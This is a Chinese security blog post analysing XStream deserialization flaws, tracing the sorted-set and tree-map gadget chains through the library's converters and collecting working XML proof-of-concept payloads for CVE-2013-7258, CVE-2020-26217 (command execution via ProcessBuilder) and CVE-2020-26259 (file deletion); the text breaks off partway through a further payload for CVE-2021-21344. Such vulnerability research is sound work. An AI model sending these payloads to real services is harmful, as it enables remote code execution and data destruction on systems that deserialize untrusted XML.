    <content type="html"><![CDATA[<h1 id="xstream介绍"><a href="#XStream介绍" class="headerlink" title="XStream介绍"></a>XStream介绍</h1><p>XStream是一个简单的基于Java库，能够将Java对象和xml文档之间进行相互转换</p><h1 id="反序列化原因"><a href="#反序列化原因" class="headerlink" title="反序列化原因"></a>反序列化原因</h1><p>XStream实现了一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换。</p><p>XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；</p><p>利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><h1 id="相关类介绍"><a href="#相关类介绍" class="headerlink" title="相关类介绍"></a>相关类介绍</h1><h2 id="eventhandler类"><a href="#EventHandler类" class="headerlink" title="EventHandler类"></a>EventHandler类</h2><p>EventHandler是一个实现了InvocationHandler接口的类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接</p><p><img src="https://cdn.clown2024.cn/image-20241104142648830.png" alt="image-20241104142648830"></p><p>EventHandler的类中有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将这两个属性作为类方法和参数继续反射调用</p><p><img src="https://cdn.clown2024.cn/image-20241104143224758.png" alt="image-20241104143224758"></p><p><img src="https://cdn.clown2024.cn/image-20241104143340622.png" alt="image-20241104143340622"></p><h2 id="converter转换器"><a href="#Converter转换器" class="headerlink" title="Converter转换器"></a>Converter转换器</h2><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p><img src="https://cdn.clown2024.cn/image-20241104143603604.png" alt="image-20241104143603604"></p><p>我看y4师傅的文章中说转换器需要实现三个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><p>但我在1.4.10版本中只需要实现两种方法即可</p><p>XStream的api文档：<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>使用一下看看转换出来的xml长什么样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> age, String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">clown</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">150</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> xStream.toXML(clown);<br>        System.out.println(xml);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>150<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>clown<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>这里就分析几个利用链，因为XStream的cve比较多，而且适用的版本也不一样，就跟着y4师傅分析其文章中的两个利用链</p><p>转化xml的demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>);<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>        xStream.fromXML(fileInputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><p>这是一个CVE-2013-7258远程代码执行漏洞</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.4.5，1.4.6或1.4.10，我这里用1.4.10版本来实验</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241104145857536.png" alt="image-20241104145857536"></p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>我们可以从报错的调用栈中开始入手分析，能看出其大致的调用链流程</p><p><img src="https://cdn.clown2024.cn/image-20241106085613877.png" alt="image-20241106085613877"></p><p>其在AbstractTreeMarshallingStrategy#unmarshal调用了TreeUnmarshaller#start方法，从这里开始解析xml内容</p><p><img src="https://cdn.clown2024.cn/image-20241106090828942.png" alt="image-20241106090828942"></p><p>这里会调用HierarchicalStreams#readClassType()来获取到PoC XML中根标签的类类型</p><p>紧接着一路往下跟进</p><p><img src="https://cdn.clown2024.cn/image-20241106091233168.png" alt="image-20241106091233168"></p><p>其最终在com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClass中找到了SortedSet类名，nameToType是一个hashMap类型变量</p><p>回到前面，这里拿到type之后就去调用convertAnother方法来对返回的type进行类型转化</p><p><img src="https://cdn.clown2024.cn/image-20241106092001977.png" alt="image-20241106092001977"></p><p>该方法内部就涉及到convertor转换器的使用，跟进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241106092354449.png" alt="image-20241106092354449"></p><p>其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型</p><p>然后就是调用converterLookup.lookupConverterForType方法来寻找TreeSet对应的类型转换器</p><p><img src="https://cdn.clown2024.cn/image-20241106093118079.png" alt="image-20241106093118079"></p><p>该方法里面就是获取迭代器对象，然后找到TreeSet对应的类型转化器就返回</p><p>返回之后就是调用convert进行类型转换，调用到AbstractReferenceUnmarshaller#convert方法</p><p><img src="https://cdn.clown2024.cn/image-20241106094933449.png" alt="image-20241106094933449"></p><p>会跳过前面的if-else判断，最后进到else里面，调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中，key的结构如下</p><p><img src="https://cdn.clown2024.cn/image-20241106095218106.png" alt="image-20241106095218106"></p><p>然后调用其父类的convert方法，在里面push到FastStack的堆栈中</p><p><img src="https://cdn.clown2024.cn/image-20241106103638037.png" alt="image-20241106103638037"></p><p>然后就是调用TreeSetConvert的unmarshal方法，继续跟进到一个填充treeMap的TreeMapConverter#populateTreeMap方法</p><p><img src="https://cdn.clown2024.cn/image-20241106105027698.png" alt="image-20241106105027698"></p><p>这里先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容填充到Map中</p><p><img src="https://cdn.clown2024.cn/image-20241106105249406.png" alt="image-20241106105249406"></p><p>里面调用readItem()函数读取标签内的内容并缓存到target这个Map中，跟进去直到com.thoughtworks.xstream.mapper.CachingMapper#realClass</p><p><img src="https://cdn.clown2024.cn/image-20241106105555385.png" alt="image-20241106105555385"></p><p>这里就会去寻找dynamic-proxy所对应的类，一路跟进，其寻找的流程和前面的类似</p><p><img src="https://cdn.clown2024.cn/image-20241106110001573.png" alt="image-20241106110001573"></p><p>最后是找到了DynamicProxy这个类</p><p>然后回到readItem方法</p><p><img src="https://cdn.clown2024.cn/image-20241106110155902.png" alt="image-20241106110155902"></p><p>获取到type之后，就去调用convertAnother方法，和前面一样去找类型转换器</p><p><img src="https://cdn.clown2024.cn/image-20241106110438659.png" alt="image-20241106110438659"></p><p>之后也是差不多的流程，一直到下面这个关键的地方，com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal方法内部</p><p><img src="https://cdn.clown2024.cn/image-20241106110843531.png" alt="image-20241106110843531"></p><p>这里按标签内容生成对应接口的动态代理，此时这个DUMMY是一个空的代理实现</p><p><img src="https://cdn.clown2024.cn/image-20241106113729142.png" alt="image-20241106113729142"></p><p>继续往下执行handler &#x3D; (InvocationHandler)context.convertAnother(proxy, handlerType);</p><p><img src="https://cdn.clown2024.cn/image-20241106113843979.png" alt="image-20241106113843979"></p><p>然后又是调用相关转换器最终得到EventHandler</p><p><img src="https://cdn.clown2024.cn/image-20241106114015121.png" alt="image-20241106114015121"></p><p>然后后面又是循环得读取标签获取对应得类和内容</p><p>回到前面获取handler的地方，再往下就是替换代理</p><p><img src="https://cdn.clown2024.cn/image-20241106114840135.png" alt="image-20241106114840135"></p><p>然后再回到前面的TreeMapConverter#populateTreeMap，这里会把结果把存到result</p><p><img src="https://cdn.clown2024.cn/image-20241106115157218.png" alt="image-20241106115157218"></p><p>这里的result就是TreeMap，然后里面就会触发我们的动态代理方法了</p><p>因为我们的xml配置代理的接口是Comparable，然后TreeMap在调用putAll方法的时候，会调用到put方法，而里面调用了compare方法</p><p><img src="https://cdn.clown2024.cn/image-20241106121046532.png" alt="image-20241106121046532"></p><p>最终就会走到EventHandler#invokeInternal方法里面，然后反射调用ProcessBuilder的start方法触发命令执行</p><p><img src="https://cdn.clown2024.cn/image-20241106121145638.png" alt="image-20241106121145638"></p><h3 id="其他说明"><a href="#其他说明" class="headerlink" title="其他说明"></a>其他说明</h3><p>在小于等于1.3.1版本，运行报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用</p><p><strong>1.4.1-1.4.4无法触发的原因</strong></p><p>在TreeSetConverter.unmarshal()中，只有当sortedMapField和treeMap不为null时，才能进入populateTreeMap()</p><p><img src="https://cdn.clown2024.cn/image-20241106122009384.png" alt="image-20241106122009384"></p><p>而1.4.1-1.4.4版本中，sortedMapField默认为null</p><p><img src="https://cdn.clown2024.cn/image-20241106122129571.png" alt="image-20241106122129571"></p><p><strong>1.4.7-1.4.9无法触发的原因</strong></p><p>ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤</p><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="影响版本"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>版本&lt;&#x3D;1.4.6或&#x3D;1.4.10</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">tree-map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>good<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tree-map</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="流程说明"><a href="#流程说明" class="headerlink" title="流程说明"></a>流程说明</h3><p>这里其实就和sorted的过程是差不多的，就不做过多的分析了</p><p>他和sorted-set的区别就是在TreeMapConverter#unmarshal的地方</p><p><img src="https://cdn.clown2024.cn/image-20241106141841502.png" alt="image-20241106141841502"></p><p>可以看到没有TreeSetConverter那么多的限制</p><p>主要还是记一下payload以及使用版本，以及后面也是只收集一些CVE的payload</p><h3 id="其他说明"><a href="#其他说明-1" class="headerlink" title="其他说明"></a>其他说明</h3><p><strong>在&lt;&#x3D;1.3.1版本</strong></p><p>会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用，与sorted-set原因一样</p><p><strong>1.4.7-1.4.9版本</strong></p><p>ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤</p><h1 id="payload收集"><a href="#payload收集" class="headerlink" title="payload收集"></a>payload收集</h1><h2 id="cve-2020-26217远程代码执行漏洞"><a href="#CVE-2020-26217远程代码执行漏洞" class="headerlink" title="CVE-2020-26217远程代码执行漏洞"></a>CVE-2020-26217远程代码执行漏洞</h2><p>影响版本&lt;&#x3D;1.4.13</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">e</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">iterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">cursor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">cursor</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">lastRet</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">lastRet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">expectedModCount</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">expectedModCount</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">outer-class</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span>/&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">iterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>KEYS<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">in</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">buf</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">buf</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">pos</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">pos</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">mark</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mark</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">in</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106145534172.png" alt="image-20241106145534172"></p><h2 id="cve-2020-26259任意文件删除漏洞"><a href="#CVE-2020-26259任意文件删除漏洞" class="headerlink" title="CVE-2020-26259任意文件删除漏洞"></a>CVE-2020-26259任意文件删除漏洞</h2><p>影响版本&lt;1.4.14</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tempFile</span>&gt;</span>test.txt<span class="hljs-tag">&lt;/<span class="hljs-name">tempFile</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建一个txt在项目根目录</p><p><img src="https://cdn.clown2024.cn/image-20241106145406896.png" alt="image-20241106145406896"></p><p>然后成功删除</p><h2 id="cve-2021-21344远程代码执行漏洞"><a href="#CVE-2021-21344远程代码执行漏洞" class="headerlink" title="CVE-2021-21344远程代码执行漏洞"></a>CVE-2021-21344远程代码执行漏洞</h2><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span 